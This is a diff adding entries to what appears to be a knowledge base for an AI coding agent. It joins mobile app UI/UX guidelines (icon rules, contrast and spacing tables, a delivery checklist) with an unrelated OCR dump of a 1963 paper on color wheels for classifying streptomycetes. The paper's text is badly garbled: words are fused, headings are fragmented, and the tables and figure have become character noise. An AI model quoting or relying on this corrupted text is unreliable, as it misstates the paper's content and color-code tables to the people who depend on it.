+| Navigation feels confusing | Quick Reference §9: `nav-hierarchy` + `bottom-nav-limit` + `back-behavior` |
+| Layout breaks on small screens | Quick Reference §5: `mobile-first` + `breakpoint-consistency` |
+| Performance / jank | Quick Reference §3: `virtualize-lists` + `main-thread-budget` + `debounce-throttle` |
+
+### Pre-Delivery Checklist
+
+- Run `--domain ux "animation accessibility z-index loading"` as a UX validation pass before implementation
+- Run through Quick Reference **§1–§3** (CRITICAL + HIGH) as a final review
+- Test on 375px (small phone) and landscape orientation
+- Verify behavior with **reduced-motion** enabled and **Dynamic Type** at largest size
+- Check dark mode contrast independently (don't assume light mode values work)
+- Confirm all touch targets ≥44pt and no content hidden behind safe areas
+
+---
+
+## Common Rules for Professional UI
+
+These are frequently overlooked issues that make UI look unprofessional:
+Scope notice: The rules below are for App UI (iOS/Android/React Native/Flutter), not desktop-web interaction patterns.
+
+### Icons & Visual Elements
+
+- 默认图标库使用 **Phosphor (`@phosphor-icons/react`)**。`src/ui-ux-pro-max/data/icons.csv` 中列出的只是常用推荐图标，不是完整集合。
+- 当推荐表中找不到合适的图标时：
+  - **优先继续从 Phosphor 的完整图标集中选择任何语义更贴切的图标**；
+  - 如果 Phosphor 也没有理想选项，可以使用 **Heroicons (`@heroicons/react`)** 作为备选，注意保持风格一致（线性/填充、笔画粗细、圆角风格）。
+
+| Rule | Standard | Avoid | Why It Matters |
+|------|----------|--------|----------------|
+| **No Emoji as Structural Icons** | Use vector-based icons (e.g., Phosphor `@phosphor-icons/react`, Heroicons `@heroicons/react`, react-native-vector-icons, @expo/vector-icons). | Using emojis (🎨 🚀 ⚙️) for navigation, settings, or system controls. | Emojis are font-dependent, inconsistent across platforms, and cannot be controlled via design tokens. |
+| **Vector-Only Assets** | Use SVG or platform vector icons that scale cleanly and support theming. | Raster PNG icons that blur or pixelate. | Ensures scalability, crisp rendering, and dark/light mode adaptability. |
+| **Stable Interaction States** | Use color, opacity, or elevation transitions for press states without changing layout bounds. | Layout-shifting transforms that move surrounding content or trigger visual jitter. | Prevents unstable interactions and preserves smooth motion/perceived quality on mobile. |
+| **Correct Brand Logos** | Use official brand assets and follow their usage guidelines (spacing, color, clear space). | Guessing logo paths, recoloring unofficially, or modifying proportions. | Prevents brand misuse and ensures legal/platform compliance. |
+| **Consistent Icon Sizing** | Define icon sizes as design tokens (e.g., icon-sm, icon-md = 24pt, icon-lg). | Mixing arbitrary values like 20pt / 24pt / 28pt randomly. | Maintains rhythm and visual hierarchy across the interface. |
+| **Stroke Consistency** | Use a consistent stroke width within the same visual layer (e.g., 1.5px or 2px). | Mixing thick and thin stroke styles arbitrarily. | Inconsistent strokes reduce perceived polish and cohesion. |
+| **Filled vs Outline Discipline** | Use one icon style per hierarchy level. | Mixing filled and outline icons at the same hierarchy level. | Maintains semantic clarity and stylistic coherence. |
+| **Touch Target Minimum** | Minimum 44×44pt interactive area (use hitSlop if icon is smaller). | Small icons without expanded tap area. | Meets accessibility and platform usability standards. |
+| **Icon Alignment** | Align icons to text baseline and maintain consistent padding. | Misaligned icons or inconsistent spacing around them. | Prevents subtle visual imbalance that reduces perceived quality. |
+| **Icon Contrast** | Follow WCAG contrast standards: 4.5:1 for small elements, 3:1 minimum for larger UI glyphs. | Low-contrast icons that blend into the background. | Ensures accessibility in both light and dark modes. |
+
+
+### Interaction (App)
+
+| Rule | Do | Don't |
+|------|----|----- |
+| **Tap feedback** | Provide clear pressed feedback (ripple/opacity/elevation) within 80-150ms | No visual response on tap |
+| **Animation timing** | Keep micro-interactions around 150-300ms with platform-native easing | Instant transitions or slow animations (>500ms) |
+| **Accessibility focus** | Ensure screen reader focus order matches visual order and labels are descriptive | Unlabeled controls or confusing focus traversal |
+| **Disabled state clarity** | Use disabled semantics (`disabled`/native disabled props), reduced emphasis, and no tap action | Controls that look tappable but do nothing |
+| **Touch target minimum** | Keep tap areas >=44x44pt (iOS) or >=48x48dp (Android), expand hit area when icon is smaller | Tiny tap targets or icon-only hit areas without padding |
+| **Gesture conflict prevention** | Keep one primary gesture per region and avoid nested tap/drag conflicts | Overlapping gestures causing accidental actions |
+| **Semantic native controls** | Prefer native interactive primitives (`Button`, `Pressable`, platform equivalents) with proper accessibility roles | Generic containers used as primary controls without semantics |
+
+### Light/Dark Mode Contrast
+
+| Rule | Do | Don't |
+|------|----|----- |
+| **Surface readability (light)** | Keep cards/surfaces clearly separated from background with sufficient opacity/elevation | Overly transparent surfaces that blur hierarchy |
+| **Text contrast (light)** | Maintain body text contrast >=4.5:1 against light surfaces | Low-contrast gray body text |
+| **Text contrast (dark)** | Maintain primary text contrast >=4.5:1 and secondary text >=3:1 on dark surfaces | Dark mode text that blends into background |
+| **Border and divider visibility** | Ensure separators are visible in both themes (not just light mode) | Theme-specific borders disappearing in one mode |
+| **State contrast parity** | Keep pressed/focused/disabled states equally distinguishable in light and dark themes | Defining interaction states for one theme only |
+| **Token-driven theming** | Use semantic color tokens mapped per theme across app surfaces/text/icons | Hardcoded per-screen hex values |
+| **Scrim and modal legibility** | Use a modal scrim strong enough to isolate foreground content (typically 40-60% black) | Weak scrim that leaves background visually competing |
+
+### Layout & Spacing
+
+| Rule | Do | Don't |
+|------|----|----- |
+| **Safe-area compliance** | Respect top/bottom safe areas for all fixed headers, tab bars, and CTA bars | Placing fixed UI under notch, status bar, or gesture area |
+| **System bar clearance** | Add spacing for status/navigation bars and gesture home indicator | Let tappable content collide with OS chrome |
+| **Consistent content width** | Keep predictable content width per device class (phone/tablet) | Mixing arbitrary widths between screens |
+| **8dp spacing rhythm** | Use a consistent 4/8dp spacing system for padding/gaps/section spacing | Random spacing increments with no rhythm |
+| **Readable text measure** | Keep long-form text readable on large devices (avoid edge-to-edge paragraphs on tablets) | Full-width long text that hurts readability |
+| **Section spacing hierarchy** | Define clear vertical rhythm tiers (e.g., 16/24/32/48) by hierarchy | Similar UI levels with inconsistent spacing |
+| **Adaptive gutters by breakpoint** | Increase horizontal insets on larger widths and in landscape | Same narrow gutter on all device sizes/orientations |
+| **Scroll and fixed element coexistence** | Add bottom/top content insets so lists are not hidden behind fixed bars | Scroll content obscured by sticky headers/footers |
+
+---
+
+## Pre-Delivery Checklist
+
+Before delivering UI code, verify these items:
+Scope notice: This checklist is for App UI (iOS/Android/React Native/Flutter).
+
+### Visual Quality
+- [ ] No emojis used as icons (use SVG instead)
+- [ ] All icons come from a consistent icon family and style
+- [ ] Official brand assets are used with correct proportions and clear space
+- [ ] Pressed-state visuals do not shift layout bounds or cause jitter
+- [ ] Semantic theme tokens are used consistently (no ad-hoc per-screen hardcoded colors)
+
+### Interaction
+- [ ] All tappable elements provide clear pressed feedback (ripple/opacity/elevation)
+- [ ] Touch targets meet minimum size (>=44x44pt iOS, >=48x48dp Android)
+- [ ] Micro-interaction timing stays in the 150-300ms range with native-feeling easing
+- [ ] Disabled states are visually clear and non-interactive
+- [ ] Screen reader focus order matches visual order, and interactive labels are descriptive
+- [ ] Gesture regions avoid nested/conflicting interactions (tap/drag/back-swipe conflicts)
+
+### Light/Dark Mode
+- [ ] Primary text contrast >=4.5:1 in both light and dark mode
+- [ ] Secondary text contrast >=3:1 in both light and dark mode
+- [ ] Dividers/borders and interaction states are distinguishable in both modes
+- [ ] Modal/drawer scrim opacity is strong enough to preserve foreground legibility (typically 40-60% black)
+- [ ] Both themes are tested before delivery (not inferred from a single theme)
+
+### Layout
+- [ ] Safe areas are respected for headers, tab bars, and bottom CTA bars
+- [ ] Scroll content is not hidden behind fixed/sticky bars
+- [ ] Verified on small phone, large phone, and tablet (portrait + landscape)
+- [ ] Horizontal insets/gutters adapt correctly by device size and orientation
+- [ ] 4/8dp spacing rhythm is maintained across component, section, and page levels
+- [ ] Long-form text measure remains readable on larger devices (no edge-to-edge paragraphs)
+
+### Accessibility
+- [ ] All meaningful images/icons have accessibility labels
+- [ ] Form fields have labels, hints, and clear error messages
+- [ ] Color is not the only indicator
+- [ ] Reduced motion and dynamic text size are supported without layout breakage
+- [ ] Accessibility traits/roles/states (selected, disabled, expanded) are announced correctly
+
+---
+> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, api]
+
 ### 📘 KNOWLEDGE: NEXUS_TALL STACKPIPELINE.MD
 
 # TALL Pipeline Agent - Full App Generator di Sandbox Stabil
@@ -20246,6 +35708,1803 @@ Mendeteksi inkonsistensi antara Model Laravel dan Migration, serta menemukan cel
 
 ---
 > **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, tdd]
+
+### 📘 KNOWLEDGE: NEXUS_TRESNER-BACKUS-1963-SYSTEM-OF-COLOR-WHEELS-FOR-STREPTOMYCETE-TAXONOMY.MD
+
+> **VERSION**: v1 | **Last Updated**: 26/05/2026
+
+
+
+## System
+of
+ColorWheelsfor
+## Streptomycete
+## Taxonomy
+## H.D.
+## TRESNERANDE.J.
+## BACKUS
+## Biochemical
+ResearchSection,
+LederleLabor-atories
+Division,American
+## Cyanamid
+Company,Pearl
+River,New
+## York;
+## Receivedforpublication
+13February
+## 1963
+## ABSTRACT
+## TRESNER,
+## H.D.
+(Lederle
+## Laboratories
+## Division,
+## American
+CyanamidCo.,
+PearlRiver,
+## N.Y.)ANDE.
+## J.
+## BACKUS.
+## System
+ofcolor
+wheelsforstreptomycete
+taxon-
+omy.Appl.
+MVicrobiol.
+11:335-338.1963.-In
+thesundry
+systemsof
+streptomycete
+taxonomy,color
+ofthesporu-
+latingaerial
+mycelium
+isfrequentlyemployed
+asasystem-
+aticcriterion.Colorseries,
+eachcontaining
+species
+of
+similar
+spore
+colors,
+aregenerallyerected;
+however,
+the
+rangeofcolors
+encompassed
+withinaseries
+isoften
+not
+clearly
+delineated
+by
+theusualword
+description.
+## There-
+fore,
+a
+system
+is
+proposed
+in
+whichthecolorcontentof
+eachseriesismoreaccurately
+defined
+by
+meansofcolor
+tabs.Seven
+spore-color
+seriesare
+recognized(i.e.,
+red,
+gray,yellow,
+blue,green,
+violet,and
+white),each
+of
+whichis
+representedby
+acolorwheel
+thatdisplays
+the
+rangeof
+colorsincluded
+therein.By
+comparingspore
+colorswiththecolorwheels,unclassified
+isolates
+can
+readily
+be
+assignedtoappropriate
+color
+groups.
+## Thecolor
+ofthe
+sporulating
+aerial
+mycelium
+ofthe
+streptomycetes
+isafeature
+thathas
+been
+used
+extensively
+for
+taxonomic
+purposes,
+andvarious
+systems
+of
+color
+groupings
+have
+been
+proposed.
+## Casual
+inspection
+ofthese
+systems
+suggests
+that
+there
+isconsiderable
+divergence
+of
+opinion
+amonginvestigators
+regarding
+the
+content
+ofthe
+groupings
+recognized.
+## If,however,
+closer
+inspection
+is
+made,
+someof
+the
+differences
+prove
+tobe
+more
+apparent
+than
+real.
+## In
+some
+of
+the
+more
+recentclassification
+schemes,
+in
+which
+color
+ofaerial
+mycelium
+plays
+an
+integral
+role,
+a
+certain
+continuity
+doesseem
+toexistbetweenthe
+common
+color
+categories
+recognized.
+## In
+## Table
+## 1,
+five
+color
+systems
+of
+varying
+complexities
+are
+compared.
+## An
+attempt
+has
+been
+made
+to
+grouptogether
+thesimilarcommon
+color
+names
+in
+each
+system
+and
+to
+arrange
+them
+in
+thesame
+order.
+## When
+thisis
+done,
+either
+fiveorsix
+general
+color
+groupsper
+system
+are
+formed:
+i.e.,
+those
+having
+white,
+yellow,
+red,gray,
+and
+blueor
+green,
+or
+both,
+as
+miajor
+components.
+## It
+will
+be
+noted
+that,
+inthe
+## Pridham,
+## Hes-
+seltine,
+and
+## Benedict
+## (1958)
+andthe
+## Ettlinger,
+## Corbaz,
+and
+## Hutter
+## (1958)systems,
+each
+general
+color
+group
+that
+is
+recognized
+is
+represented
+by
+a
+single
+color
+series.
+## How-
+ever,
+in
+the
+other
+three
+systems
+the
+commoncolor
+groups
+are
+mostly
+subdivided
+into
+multiple
+seriesthatare
+formed
+on
+thebasis
+ofdifferent
+combinations
+ofaerialmycelial
+## (enmasse
+spores)colors
+withdifferent
+colors ofvegetative
+mycelium.
+## Whenthelarger
+colorcategories
+aredivided
+intothe
+variousseries,
+themainintent,
+ofcourse,is
+to
+systematically
+separate
+thestreptomycetes
+intoas
+many
+smallerparcels.
+## Ideally,
+thedescriptive
+colorterminology
+employed
+withtheseseries
+should,
+atthesametime,
+effectively
+definetherange
+ofspore
+colorsexhibited
+by
+the
+organisms
+contained
+therein.Unfortunately,
+this
+is
+notalways
+accomplished.
+## In
+practice,
+attempts
+atwritten
+communication
+of
+colorterminology
+between
+individuals
+oftenproveto
+be
+veryconfusing.
+## Colordesignations
+meaningful
+toone
+may
+suggestsomething
+quite
+differenttoanother.
+## Hence,
+itis
+notsurprising
+that,in
+themany
+existingtaxonomic
+systems,
+differentcolor
+termsareused
+todescribe
+color
+serieswhich
+areundoubtedly
+thesame
+orcomparable.
+## Examples
+ofthismay
+beobservedin
+Table1.Itwould
+seem,
+then,that,even
+thoughthevarious
+colorsystems
+mayappear
+dissimilar,
+inrealitymany
+ofthedifferences
+are
+only
+superficialand
+primarilya
+matterofsemantics.
+## Theuseofauniform
+descriptive
+color
+terminology,
+perhaps
+employingasingle
+color
+code,
+couldbeuseful
+in
+attaining
+betteruniversal
+agreement
+oncolorvalues
+among
+streptomycetetaxonomists.
+## Towardachievement
+of
+thisobjective,weare
+proposinga
+newsystem
+that
+recognizes
+sevenspore-color
+series,each
+represented
+bya
+colorwheelcomposed
+ofselectedcolor
+chipsfrom
+the
+## Color
+HarmonyManual
+(Jacobson,Granville,
+and
+## Foss,
+## 1948)
+whichsetforththe
+rangeofcolors
+encompassed
+by
+each
+individual
+series.
+## MATERIALS
+## AND
+## METHODS
+## Color
+mayplay
+animportant
+role
+in
+theclassification
+ofthe
+streptomycetes,
+providing
+that
+proper
+useismade
+ofthiscriterion.
+## Whenthe
+sporulating
+aerial
+mycelium
+of
+mature
+culturesis
+observedunder
+suitablelighting
+con-
+ditions,
+it
+will
+be
+noted
+that
+each
+cultureexhibitsa
+characteristic
+color.
+## Although
+the
+specific
+shade
+may
+vary
+slightly
+fromtimeto
+time
+depending
+upon
+the
+depth
+of
+the
+sporulation
+layer,
+intensity
+of
+underlyingpigmenta-
+tion,age
+of
+culture,type
+of
+medium,
+etc.,
+nevertheless,
+theculture
+can
+be
+reliablyassigned
+toa
+general
+color,
+e.g.,grayish,
+bluish,greenish,
+etc.When
+mass
+collections
+of
+streptomycetes
+are
+classified
+according
+tothis
+method,
+itisobserved
+thatall
+well-sporulated
+cultures
+generally
+fall
+readily
+intoa
+relatively
+few
+suchcolor
+groups.
+## Ithas
+## 335
+Downloaded from https://journals.asm.org/journal/am on 05 May 2026 by 36.77.102.63.
+
+## TRESNER
+## AND
+## BACKUS
+cc
+cd
+## P45
+## ._
+cc
+## 0)
+## S.
+x
+## ¢q
+## APPL.
+## MICROBIOL.
+## I-,
+cc
+cc
+## 0
+## 4-
+## -cc
+## -
+## .4-
+## .bl0
+## 0~~~~~~~~
+o"~~~~~~~~~~~~~~~~~
+## ~~~~~~L
+biD0
+## ~0
+## ~"
+b
+cAf
+bD
+## 0
+## 0
+## 0
+bO
+## 0
+## 0
+## *-)~~~~~
+"0b0D
+## 0
+## 0~~~~~~~~~~~~~~~~~~~~~~
+i
+cd
+## 0~~~~~
+## 0
+## -
+o
+## ~~~~~~~~~~~~~~~~~~~~~~
+## 5-b
+## 0
+## 0
+## ~~~~~~~~~~~~~~~~
+## -4-D
+## ~~-
+## --
+## 0
+## ~~~~~~~~~00b
+## Cd~~~~~~~~~~~~~~~~
+bo
+## 0~~~~~~0
+## 00
+oo
+## WI)
+biD~~~~~~~~~0"
+## Cs
+## ~~~~-0
+bID
+## 0
+## S.
+## "0"0~~~~
+## ~~~~~~~~~C
+## O
+## 0
+ce~~~~~~~~~~~~4
+## Ca
+## ~~
+## ~
+## ~
+## 0
+LbiD
+## ~E
+## 4))44z..-4
+## )
+## ;
+w; w O.,a.;D
+## _
+## 4
+## ._
+## ._
+## ._
+## ._
+## ._
+## 0._
+## -
+## =
+## ==
+## =
+## =-n
+## =
+## X~0
+## 0)
+## 45
+## 0L)
+## 0)I
+## I-
+## 0)
+## 45
+## 03
+## 0)
+## I)
+## 5
+## C
+## >
+## L
+## X
+## 0
+## .(4
+## OO
+## 0
+w
+## ')
+## _.
+## '
+b
+## ,4
+## 0)
+## C5
+## 4)
+4Lc)
+## .
+## BA,_;
+## 4
+ce
+## N
+be
+## ._
+## -4-)
+## 0
+## 0
+c
+## 01)
+## 0)c
+## _-_
+## F-
+## 4Z.~~~~~~
+c_
+c45Z"0_5
+## O4.)
+## -'.
+## O
+## Q
+## 00
+## <
+## -:
+## ¢
+## F1¢O
+## _c
+## _
+## _
+## 0__-
+## -4
+## 0)=
+## 0)4.
+## C
+## 0)-4
+## O
+## .
+## .
+## .-.,.,o
+b=
+## 1-f-
+## °.
+## Q
+b
+## U¢C-~
+u
+## 0
+## 0o
+r:0
+## 4)4
+## U-,o
+## 'd
+## 1.
+## 9
+co
+## 0
+o
+## E
+a
+## 00
+## -4
+bO
+iz
+cc
+## ._
+## Z
+## 0
+## 45
+## ._
+## 336
+## 0
+## _4
+cN
+## 60
+## 45
+## 4)
+## Ns
+## $)
+## 0%
+## '4
+## -8
+## Ca
+r._
+## 0
+## .4)
+cn
+## 4)4
+## "0
+## '4-
+co
+## 0
+co
+## .-
+## -4
+Downloaded from https://journals.asm.org/journal/am on 05 May 2026 by 36.77.102.63.
+
+## COLOR
+## WHEELS
+## FORSTREPTOMNIYCETE
+## TAXO.NOMIY3
+beenour
+experience
+thatseven
+color
+seriesaccommodate
+allthe
+streptomycetes
+observed
+todate.
+## Itis
+virtually
+impossibletoapplycolorterminology
+to
+these
+seriesthat
+willdefine
+withprecision
+for
+everyone
+the
+range
+ofcolor
+shades
+represented
+ineach
+group.
+## TABLE
+2.Color
+## Harmony
+## Manualcode
+andcommon-namle
+designations
+forthe
+huesincluded
+intheseven
+spore-color
+series
+## CHMI
+code
+## CHM
+hues
+CHMcode
+## CHM
+hues
+## Colors
+inRed
+## (R)
+series
+Lt.Ivory;
+## Eggshell
+## Lt.
+## Melon
+## Yellow
+Lt.Apricot
+## Nude
+Tan;Rose
+## Beige
+PeachTan
+## Cork
+## Tan
+## Lt.
+## Fawn;
+## Rose
+## Beige
+## Rosewood
+## Pussywillow
+## Gray
+PowderRose
+## Dusty
+## Peach
+## Bisque;
+## Lt.
+## Rose
+## Beige
+## Bisque;
+## Lt.
+## Beige
+## No
+## Name
+## (near
+grays)
+## Baby
+## Pink;
+## Pale
+## Pink
+## Flesh
+## Pink;
+## Pale
+## Peach;
+## Shell
+## Pink;
+## Tearose
+## Pearl
+## Pink;
+## Shell
+## Colors
+in
+## Blue
+## (B)
+series
+## Lt.
+## Aqua
+## Aqua
+## Gray
+## Dusty
+## Aqua
+## Green
+## Aqua
+## Gray
+## Bayberry
+## Gray
+Med.Blue
+## Spruce
+## Jade
+## Gray
+## Blue
+## Spruce
+## Colors
+in
+## Yellow
+## (Y)
+series
+## Ivory
+## Pearl;
+## Shell
+## Tint
+## Yellow
+## Tint
+## Parchment
+## Pastel
+## Yellow
+PastelYellow
+Bamboo;Buff;
+## Straw;
+## Wheat
+## No
+## Name
+## (near
+grays)
+## Putty;
+## Griege
+## Putty
+## Parchment
+## 2
+dc
+## 2
+ge
+## 3ge
+## 4
+ig
+## 4
+li
+## 3
+li
+## 3ig
+## 2ih
+## 3
+ih
+## 5
+ih
+## 7
+ih
+## 7fe
+## 5fe
+g
+e
+d
+## 2
+fe
+## 3
+fe
+## 1½
+ge
+## 1
+ig
+## 1½
+ig
+## 1½li
+## 1
+li
+## 24½ih
+## 24
+ih
+## 24
+li
+## 24ki2li
+## 24
+ml
+## 11
+ca
+## 10
+ec
+## 11ec
+## 10
+gc
+## 11
+gc
+a
+b
+## 13
+ba
+ColorsinGray(GY)
+series
+## Natural;
+## String
+CovertTan;Griege
+## Beige;
+## Camel
+## Fawn
+## Beaver
+## Beaver
+## Beige
+Brown;Mist
+## Brown
+DarkCovert
+## Gray
+## Beige
+## Gray;
+## Mouse
+LeadGray;
+## Shadow
+## Grav
+TaupeGray
+## Ashes
+## Ashes
+## Gray(gray
+scale)
+## Gray(gray
+scale)
+NoName
+## (gray
+scale)
+## Covert
+## Gray
+SilverGray
+## Colors
+inGreen
+## (GN)
+series
+## Lt.
+## Olive
+## Gray
+## Olive
+## Gray
+## Olive
+## Gray
+## Lt.
+## Olive
+## Drab
+Lt.Olive
+## Drab
+## Mistletoe
+## Gray
+## Sage
+## Gray
+Dk.Reseda
+## Green;
+## Sage
+## Green
+## Mistletoe
+## Green
+## Ivy
+ColorsinViolet
+## (V)
+series
+## Pale
+## Lilac
+## Orchid
+## Mist
+## Wistaria
+## Orchid
+## Lilac
+ColorsinWhite
+## (W)
+series
+## White
+## Oyster
+## White
+## Alabaster
+## Tint
+## Therefore,
+wefind
+itpreferable
+toapply
+asimple
+color
+designation
+toeach
+recognizable
+group
+andthen
+define
+thecontent
+ofeach
+groupby
+moreaccurate
+and
+graphic
+means.
+## Toaccomplish
+this,thecolor
+ofsporulation
+of
+several
+hundreds
+ofstreptomycetes,
+bothdescribed
+species
+and
+unclassified
+soilisolates,
+was
+matchedunder
+north-window
+daylight
+withcolor
+tabsof
+theColor
+## Harmony
+## Manual.
+## Wehave
+observed
+thatthis
+manualprovides
+an
+excellent
+color
+guide
+for
+matchingthe
+subtle,
+pastel
+shades
+ex-
+pressed
+inthespores
+ofthe
+streptomycetes.
+## In
+almost
+all
+instances,
+wewere
+ableto
+findcolor
+tabs
+which
+closely
+approximated
+the
+spore
+colors,of
+the
+organisms
+studied.
+## Then,
+byselecting
+theseparticular
+chips
+and
+arranging
+themintotheirrespective
+color
+groups
+according
+tocertain
+underlying
+colorsimilarities,
+therange
+ofcolors
+covered
+and
+the
+limits
+oftheseven
+series
+weredefined.
+## Sincethe
+concept
+ofthese
+colorseries
+wasalready
+preconceived,
+butwas
+lacking
+in
+clear-cut
+definition,
+arrangement
+ofthe
+chips
+intothe
+differentgroups
+did
+not
+entirely
+dictate
+the
+outlinesofeachseries.
+## It
+did,
+however,help
+clarify
+the
+reasons
+spore-color
+groupssuggest
+themselves
+whenone
+inspects
+massesof
+isolates.
+## Forexample,
+certain
+cultures
+allhad
+in
+commonsomeshade
+of
+gray,
+whether
+itbe
+lightgray,
+dark
+gray,brownish-gray,
+olive-gray,
+etc.
+## Stillothers
+hadsome
+shade
+ofred
+in
+combination
+with
+other
+colors,
+to
+give
+awidevariety
+of
+pinkish
+to
+pinkish-
+cinnamon
+values,
+butall
+containing
+thebasic
+red
+element.
+## Othernaturalserieshadyellow,
+green,
+blue,
+violet,
+or
+white
+as
+theunderlyingcolor
+in
+common.
+## Forthe
+sakeof
+convenience
+andpracticality
+in
+making
+useofthedifferentcolor
+groupings,
+the
+ColorHarmony
+## FIG.1.
+## Wheel
+arrangement
+of
+theColorHarmonyManual
+chips
+as
+nised
+inthe
+various
+colorseries.
+## 2ca
+## 3
+ea
+## 4
+ea
+## 4gc
+## 5gc
+## 4
+ie
+## 4
+ge
+5 ge
+## 5
+dc
+## 6
+ec
+## 5ec
+## 4ec
+## 3
+ec
+## 5
+cb
+## 7ca
+## 5ca
+## 3
+ca
+## 18
+ec
+## 19dc
+## 19
+ge
+## 19
+fe
+## 22fe
+## 20
+ig
+## 21
+ig
+## 20
+li
+## 2
+db
+## 2ba
+## 1ba
+## 1½I
+db
+## 1
+db
+## 11fb
+## 2
+fb
+## 241
+dc
+## 1
+dc
+## 1½,ec
+## 1cb
+## V'OL.
+## 11)
+## 1963
+## 337
+Downloaded from https://journals.asm.org/journal/am on 05 May 2026 by 36.77.102.63.
+
+## TRESNER
+## AND
+## BACKUS
+## Manualchipsineachseries
+werearrangedintocolor
+wheels(Fig.1).Anattempt
+wasmadetoplacethechips
+aroundthewheelssothat
+they
+formedacontinuous
+and
+harmoniousspectrumwithin
+eachseries.However,this
+wasnotalwayspossible,since
+manyhues,neededtoforma
+completecontinuum,were
+not
+representedbyany
+of
+the
+streptomycetesexamined.
+## Itis
+possiblethat
+someof
+the
+missinghuescouldeventually
+befoundwereenough
+organisms
+studied.
+## This,
+ofcourse,isoflittleconsequence,
+since,
+in
+using
+the
+system
+asitis
+designed,
+the
+objective
+isnotnecessarilytomatch
+withprecisiontheexactshade
+of
+anorganism,although
+thisis
+frequentlypossible;rather,
+itistodeterminesimplyto
+whichgeneralcolorseries
+it
+belongs.
+## Even
+though
+the
+spore
+color
+of
+a
+culture
+may
+be
+intermediate
+betweenthosetabsrepresented
+in
+acolor
+wheel,this
+becomesobvioustotheobserver
+uponinspec-
+tion,anddoesnotcauseanyparticulardifficulty
+in
+estab-
+lishingthecolorseries
+relationship.
+## RESULTSANDDISCUSSION
+## Asi-idicatedearlier,
+definitionofeachcolorseries
+by
+all-inclusive
+descriptive
+termsis
+impractical
+andunneces-
+sary;therefore,
+we
+have
+designated
+them
+simply
+as
+the
+gray(GY),
+red
+(R),yellow
+## (Y),
+blue
+(B),green(GN),
+violet
+## (V),
+and
+white
+## (W)
+series.
+## In
+## Table
+## 2,
+the
+## Color
+## Harmony
+## Manualvalues
+ofthevarioustabs
+in
+eachof
+these
+color
+seriesare
+given
+intheorder
+theyappear
+in
+the
+color
+wheels.Bothcode
+designations
+andcommon
+names
+are
+provided
+foreach
+chip.
+## In
+makingapplication
+of
+the
+colorwheel
+system
+for
+taxonomic
+purposes,
+certain
+procedures
+needtobeob-
+served
+in
+order
+touseitmost
+effectively.
+## For
+example,
+comparison
+of
+color
+tabswithculturesshouldbemadein
+north-windowdaylight,preferably
+ona
+brightday
+or
+under
+comparable
+artificial
+lighting
+conditions.
+## (A
+satis-
+factory
+substitute
+is
+provided
+by
+theMacbeth
+## Daylight-
+ing
+## Lablite
+model
+## BBX-526
+withColor
+MatchingBooth,
+MacbethDaylighting
+Corp.,Newburgh,N.Y.)Only
+the
+dull
+ornonreflective
+surface
+of
+the
+## Color
+## Harmony
+## Manual
+chips
+should
+beused.
+## It
+may
+evenbe
+advantageous
+to
+remove
+a
+tab
+fromthe
+wheelforcareful
+comparisons.
+## Cultures
+being
+studiedshould
+be
+mature
+## (about
+## 2
+to3
+weeks
+old),except
+in
+instances
+where
+spore
+masses
+undergo
+breakdown
+andbecome
+hygroscopic
+anddarkenedwith
+age;spore
+color
+of
+these
+organisms
+should
+be
+measured
+prior
+tosuch
+changes.
+## The
+presence
+of
+sporemasses,
+sufficientlyheavy
+to
+characterizethecolorofthe
+aerial
+growth,
+should
+always
+be
+ascertainedbefore
+attempting
+to
+make
+a
+color-tab
+comparison.
+## Themeasurementof
+the
+color
+of
+nonsporing
+aerial
+mycelium
+isofnovalue
+for
+presentpurposes,
+since
+itis
+subject
+toconsiderable
+varia-
+tion
+dependingupon
+culturalandnutritionalfactors.
+## Culturesshould
+beobservedonseveralmediabefore
+makingspore-color
+determinations.
+## In
+this
+way,
+one
+is
+able
+to
+detect
+and
+discountthe
+interfering
+influences
+exerted
+by
+the
+colorof
+underlying
+substrate
+thallus,pig-
+ments,
+or
+medium.
+## Thecolor
+measurementisbestmadeon
+clearmediathatprovide
+goodsporulationbutdonot
+supportabundantpigmentformation
+bytheorganisms.
+## Asaresultofthewidearray
+ofcolorsandshadesex-
+hibitedbythesporesinthe
+manyspeciesofstreptomyces,
+aclear-cutseparationofcolor
+seriesisnotpossible.For
+thisreason,thereareafew
+locationsoncertainofthe
+colorwheelsinwhichanindividual
+tabwillbenearin
+colortooneinanotherseries.
+## Forexample,thefollowing
+combinationsofColorHarmony
+## Manualchipshave
+similarities
+whichmightcause
+someconfusioninusing
+the
+system:
+## 112
+ge(G\Nseries)
+and
+## 112
+ec(Yseries);
+## 2
+ca(Rseries)and2dbor
+2ba(Yseries);4ge(Rseries)
+and
+## 4
+ig(GYseries);and
+3ec(Rseries)and3ge(GY
+series).However,thisneed
+notbeaseriousdefectinthe
+systemaslongasprovisions
+aremadeforsuchrecognized
+similarities.
+## A
+simplesolution
+tothisproblem,ofcourse,
+istoclassifytherelativelyfew
+specieswhichfallintosuch
+questionablepositionsinto
+bothofthecolorseriesin-
+volved.Then,byadevice
+commonlyusedintaxonomic
+keys,bothpathwaysfollowed
+tothespecieslevelcanbe
+designedtoconvergetoacommon
+positioninthekey.
+## Ithasbeenourexperience
+that,whendiligenceisprac-
+ticedin
+observingandmatching
+colorsunderproperlight-
+ingconditions,moststreptomycetes
+canbereadilycate-
+gorizedaccordingtothecolor
+serieswerecognize.Through
+the
+useofasystem,suchas
+proposedhere,inwhichthe
+colorseriesarecarefullydefined,
+sporulationcolortheni
+becomesaveryusefulprimary
+taxonomicimplement
+in
+the
+classificationofthestreptomycetes.
+## ACKNOWLEDGMENTS
+## Theforegoingcolorwheel
+systemwaspresentedatthe
+InternationalSubcommittee
+onTaxonomyoftheActino-
+mycetalesWorkshopheldat
+theDepartmentofBacteriol-
+ogy
+and
+Immunology,MIcGill
+University,Montreal,
+## Canada,
+## 18
+## August1962.
+## Theauthorswishtoexpress
+their
+appreciationforthe
+conistructivecommentsand
+suggestions
+about
+thesystem
+offeredbythose
+whoat-
+tended
+thesession.
+## LITERATURECITED
+## BALDACCI,
+## E.
+1959.Development
+intheclassificationof
+actinomy-
+cetes.
+Giorn.Microbiol.
+## 6:10-27.
+## ETTLINGER,L.,R.CORBAZ,
+ANDR.HtTTER.1958.Zursystematik
+der
+actinomyceten.
+4.Eine
+ArteinteilungdergattungStrep-
+tomyces
+## Waksmanet
+Henrici.Arch.Mikrobiol.31:326-358.
+## GAUZE,
+## G.F.,T.
+## P.PREOBRAZHENSKAYA,E.S.KUDRINA,N.0.
+## BLINOV,
+## I.D.
+## RYABOVA,
+## ANDM.A.
